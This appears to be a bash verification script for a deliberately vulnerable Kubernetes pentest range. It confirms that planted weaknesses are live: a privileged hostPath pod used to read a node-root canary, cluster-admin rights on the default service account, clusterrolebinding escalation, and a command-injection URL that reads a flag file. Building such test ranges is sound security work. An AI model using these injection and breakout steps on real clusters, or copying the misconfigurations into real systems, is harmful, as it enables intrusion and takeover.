#!/usr/bin/env bash
# Sanity-check that the planted kill chain is actually live. Not exhaustive —
# proves the key rungs exist so the pentest tool has real targets.
set -uo pipefail
pass=0; fail=0
ok(){ echo "  ✅ $1"; pass=$((pass+1)); }
no(){ echo "  ❌ $1"; fail=$((fail+1)); }

echo "== workloads =="
kubectl get pod -n shop -l app=shop-app -o jsonpath='{.items[0].status.phase}' 2>/dev/null | grep -q Running && ok "shop-app running" || no "shop-app not running"
kubectl get deploy -n shop node-debugger -o jsonpath='{.status.availableReplicas}' 2>/dev/null | grep -q '^[1-9]' && ok "V16 node-debugger (privileged+hostPath) running" || no "V16 not running"
kubectl get ds -n shop canary-planter -o jsonpath='{.status.numberReady}' 2>/dev/null | grep -q '^[1-9]' && ok "C04 canary-planter ready" || no "C04 planter not ready"
ndp=$(kubectl get pod -n shop -l app=node-debugger -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)
[ -n "$ndp" ] && kubectl exec -n shop "$ndp" -- cat /host/home/CANARY-C04 2>/dev/null | grep -q 'H3-CANARY-C04' && ok "C04 node-root canary readable via breakout (real node access)" || no "C04 not readable off node"
kubectl get deploy -n backend beacon >/dev/null 2>&1 && ok "C03 beacon listener deployed" || no "beacon missing"

echo "== RBAC (V11 default SA = cluster-admin) =="
kubectl auth can-i '*' '*' --as=system:serviceaccount:shop:default >/dev/null 2>&1 && ok "shop:default is cluster-admin" || no "V11 not effective"
echo "== RBAC (V13 bind/escalate) =="
kubectl auth can-i create clusterrolebindings --as=system:serviceaccount:shop:release-bot >/dev/null 2>&1 && ok "release-bot can create CRBs" || no "V13 not effective"

echo "== app vulns (in-cluster curl) =="
kubectl run vtest --rm -i --restart=Never --image=busybox:1.36 -n shop -- \
  sh -c 'wget -qO- "http://shop-app.shop.svc/ping?host=127.0.0.1;cat%20/flags/C01_FLAG" 2>/dev/null' 2>/dev/null \
  | grep -q 'H3-CANARY-C01' && ok "V06 RCE + C01 canary reachable" || no "V06/C01 check failed"

echo "== edge exposure =="
kubectl get svc -n edge internal-admin -o jsonpath='{.spec.type}' 2>/dev/null | grep -q NodePort && ok "V03 internal-admin NodePort" || no "V03 missing"
kubectl get svc -n ingress-nginx ingress-nginx-controller -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null | grep -q '.' && ok "ingress-nginx has external IP" || echo "  ⏳ ingress LB IP pending"

echo ""
echo "== summary: $pass ok, $fail failed =="
